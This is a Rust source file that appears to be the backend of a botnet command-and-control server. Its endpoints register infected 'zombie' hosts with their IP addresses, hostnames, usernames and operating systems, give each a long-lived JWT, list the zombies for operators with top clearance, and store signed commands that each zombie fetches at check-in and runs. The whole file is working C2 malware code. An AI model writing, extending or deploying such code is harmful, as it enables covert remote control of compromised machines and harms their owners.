
use axum::{extract::{Path, State}, http::{HeaderMap, StatusCode}, Json};
use jsonwebtoken::{decode, encode, DecodingKey, EncodingKey, Header, Validation};
use serde::{Deserialize, Serialize};
use serde_json::json;
use sqlx::{query_as, types::{ipnetwork::IpNetwork, Uuid}, PgPool};

use crate::{login_controller::is_authorized, login_model::{Claims, Clearance}};

#[derive(Serialize)]
enum Status {
    ONLINE = 0,
    OFFLINE = 1,
    PAUSED = 2,
    UNINSTALLED = 3,
    UNKNOWN = 4
}

#[derive(Serialize)]
pub struct ZombieRow {
    id: String,
    internal_ip: Option<IpNetwork>,
    external_ip: Option<IpNetwork>,
    hostname: Option<String>,
    username: Option<String>,
    operating_system: Option<String>
}

#[derive(Serialize)]
pub struct CommandRow {
    id: i32,
    uid: String,
    prev: i64,
    nonce: i64,
    command: String,
    signature: String,
}

pub async fn get_zombies(State(pg_pool):State<PgPool>, header_map: HeaderMap) -> Result<(StatusCode, String), (StatusCode, String)> {
    // access control
    if !is_authorized(header_map, Clearance::TopSecret) {
        return Err((
            StatusCode::UNAUTHORIZED, 
            json!({"success": false, "message": "Not authorized".to_string()}).to_string(),
        ));
    }

    let rows = sqlx::query_as!(ZombieRow, "SELECT id, internal_ip, external_ip, hostname, username, operating_system FROM zombies")
        .fetch_all(&pg_pool)
        .await
        .map_err(|e| {(
            StatusCode::INTERNAL_SERVER_ERROR,
            json!({"success": false, "message": e.to_string()}).to_string(),
        )})?;
        
        Ok((
            StatusCode::OK,
            json!({"success": true, "data": rows}).to_string(),
        ))
}

#[derive(Deserialize)]
pub struct CreateZombieReq {
    internal_ip: Option<IpNetwork>,
    external_ip: Option<IpNetwork>,
    hostname: Option<String>,
    username: Option<String>,
    operating_system: Option<String>,
}

#[derive(Serialize)]
pub struct CreateZombieRow {
    id: String,
}

pub async fn create_zombie(State(pg_pool):State<PgPool>, header_map: HeaderMap, Json(user): Json<CreateZombieReq>) 
  -> Result<(StatusCode, String), (StatusCode, String)> {
    // access control
    if !is_authorized(header_map, Clearance::None) {
        return Err((
            StatusCode::UNAUTHORIZED, 
            json!({"success": false, "message": "Not authorized".to_string()}).to_string(),
        ));
    }

    let row = sqlx::query_as!(
        CreateZombieRow, 
        "INSERT INTO zombies (internal_ip, external_ip, hostname, username, operating_system) VALUES ($1, $2, $3, $4, $5) RETURNING id",
        user.internal_ip, user.external_ip, user.hostname, user.username, user.operating_system
    ).fetch_one(&pg_pool)
    .await
    .map_err(|e| {(
        StatusCode::INTERNAL_SERVER_ERROR,
        json!({ "success": false, "message": e.to_string() }).to_string(),
    )})?;

    let claims = Claims {
        uid: -1,
        sub: row.id.clone(),
        prv: Clearance::Private,
        exp: (chrono::Utc::now() + chrono::Duration::weeks(10)).timestamp() as usize
    };

    let token = match encode(&Header::default(), &claims, &EncodingKey::from_secret(std::env::var("JWT_SECRET").unwrap().as_ref())) {
        Ok(tok) => tok,
        Err(e) => {
             eprintln!("Error generating Token: {}", e.to_string());
             e.to_string()
        }.to_owned(),
    };

    return Ok((StatusCode::OK, json!({ "success": true, "token": token, "uid": row.id.clone(), "pub_key": "tester"}).to_string()));
}


#[derive(Deserialize)]
pub struct UpdateZombieReq {
    internal_ip: Option<String>,
    external_ip: Option<String>,
    hostname: Option<String>,
    username: Option<String>,
    operating_system: Option<String>,
}

pub async fn update_zombie(State(pg_pool):State<PgPool>, header_map: HeaderMap, Path(usr_id): Path<String>, Json(user): Json<UpdateZombieReq>) 
  -> Result<(StatusCode, String), (StatusCode, String)> {
    // access control
    if !is_authorized(header_map.clone(), Clearance::Private) {
        return Err((
            StatusCode::UNAUTHORIZED, 
            json!({"success": false, "message": "Not authorized".to_string()}).to_string(),
        ));
    }

    // verify user id
    let token = header_map.get("Authorization").unwrap().to_str().unwrap().trim_start_matches("Bearer ").to_string();
    match decode::<Claims>(&token, &DecodingKey::from_secret(std::env::var("JWT_SECRET").unwrap().as_ref()), &Validation::default()) {
        Ok(token_data) => {
            let claims = token_data.claims;
            if usr_id != claims.sub {
                return Err((StatusCode::INTERNAL_SERVER_ERROR, json!({"success":false, "message": "Enumeration detected!"}).to_string()))
            }
        },
        Err(e) => {
            return Err((StatusCode::INTERNAL_SERVER_ERROR, json!({"success":false, "message": e.to_string()}).to_string()))
        }
    }


    let mut query = "UPDATE zombies SET id = $1".to_owned();

    let mut i = 2;

    if user.internal_ip.is_some() {
        query.push_str(&format!(", internal_ip = ${i}"));
        i += 1;
    };

    if user.external_ip.is_some() {
        query.push_str(&format!(", external_ip = ${i}"));
        i += 1;
    };

    if user.hostname.is_some() {
        query.push_str(&format!(", hostname = ${i}"));
        i += 1;
    };

    if user.username.is_some() {
        query.push_str(&format!(", username = ${i}"));
        i += 1;
    };

    if user.operating_system.is_some() {
        query.push_str(&format!(", operating_system = ${i}"));
    };

    query.push_str(&format!(" WHERE id = $1"));

    let mut s = sqlx::query(&query).bind(Uuid::parse_str(&usr_id).unwrap());

    if user.internal_ip.is_some() {
        s = s.bind(IpNetwork::V4(user.internal_ip.unwrap().parse().unwrap()));
    }

    if user.external_ip.is_some() {
        s = s.bind(IpNetwork::V4(user.external_ip.unwrap().parse().unwrap()));
    }

    if user.hostname.is_some() {
        s = s.bind(user.hostname);
    }

    if user.username.is_some() {
        s = s.bind(user.username);
    }

    if user.operating_system.is_some() {
        s = s.bind(user.operating_system);
    }

    s.execute(&pg_pool).await.map_err(|e| {
        (
          StatusCode::INTERNAL_SERVER_ERROR,
          json!({"success": false, "message": e.to_string()}).to_string(),
        )
    })?;

    // get commands to execute:
    let uid = Uuid::parse_str(&usr_id).unwrap();
    let cmd = query_as!(CommandRow, "SELECT id, uid, prev, nonce, command, signature FROM commands WHERE uid = $1 ORDER BY id DESC", uid)
        .fetch_one(&pg_pool)
        .await
        .map_err(|e| {(
            StatusCode::INTERNAL_SERVER_ERROR,
            json!({"success": false, "message": e.to_string()}).to_string(),
    )})?;
    
    Ok((StatusCode::OK, json!({"success":true, "prev": cmd.prev, "nonce": cmd.nonce, "cmd": cmd.command, "sig": cmd.signature}).to_string()))
}

#[derive(Deserialize)]
pub struct CreateCommandReq {
    uid: String,
    prev: i64,
    nonce: i64,
    command: String,
    signature: String,
}

#[derive(Serialize)]
pub struct CreateCommandRow {
    id: i32,
}

pub async fn create_command(State(pg_pool):State<PgPool>, header_map: HeaderMap, Json(cmd): Json<CreateCommandReq>) 
  -> Result<(StatusCode, String), (StatusCode, String)> {
    // access control
    if !is_authorized(header_map, Clearance::TopSecret) {
        return Err((
            StatusCode::UNAUTHORIZED, 
            json!({"success": false, "message": "Not authorized".to_string()}).to_string(),
        ));
    }

    let uuid = Uuid::parse_str(&cmd.uid).unwrap();

    let row = sqlx::query_as!(
        CreateCommandRow, 
        "INSERT INTO commands (uid, prev, nonce, command, signature) VALUES ($1, $2, $3, $4, $5) RETURNING id",
        uuid, cmd.prev, cmd.nonce, cmd.command, cmd.signature
    ).fetch_one(&pg_pool)
    .await
    .map_err(|e| {(
        StatusCode::INTERNAL_SERVER_ERROR,
        json!({ "success": false, "message": e.to_string() }).to_string(),
    )})?;

    return Ok((StatusCode::OK, json!({ "success": true, "id": row.id}).to_string()));
}